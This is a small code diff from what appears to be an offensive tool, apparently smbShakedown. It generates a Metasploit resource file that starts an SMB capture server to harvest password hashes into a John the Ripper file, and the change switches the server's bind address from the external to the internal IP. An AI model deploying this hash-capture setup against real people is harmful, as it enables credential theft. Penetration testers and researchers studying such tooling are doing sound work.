@@ -134,7 +134,7 @@ Recipients:     {9}\n').format(self.rc_file, self.sender_address, self.sender_na
         if smb_server_option is True:
             rc_config = \
             'use auxiliary/server/capture/smb\n'+\
-            'set srvhost {}\n'.format(self.external_ip)+\
+            'set srvhost {}\n'.format(self.internal_ip)+\
             'set JOHNPWFILE /opt/smbShakedown/smb_hashes\n'+\
             'exploit -j -z'
         
